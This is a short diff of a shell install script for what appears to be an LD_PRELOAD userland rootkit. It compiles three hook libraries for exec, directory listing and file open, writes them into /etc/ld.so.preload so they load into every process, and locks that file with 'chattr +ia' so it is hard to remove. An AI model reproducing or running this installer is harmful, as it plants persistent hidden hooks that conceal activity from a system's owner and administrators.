@@ -41,9 +41,12 @@ dir=$PWD
 
 gcc $type h00kExec.c $flags h00kExec.so
 gcc $type h00kDir.c $flags h00kDir.so
+gcc $type h00kOpen.c $flags h00kOpen.so
 
 if [ "$1" != "--no-hook" ]; then
 	echo $dir/h00kDir.so > /etc/ld.so.preload
+	echo $dir/h00kExec.so >> /etc/ld.so.preload
+	echo $dir/h00kOpen.so >> /etc/ld.so.preload
 	chattr +ia /etc/ld.so.preload
 fi
 
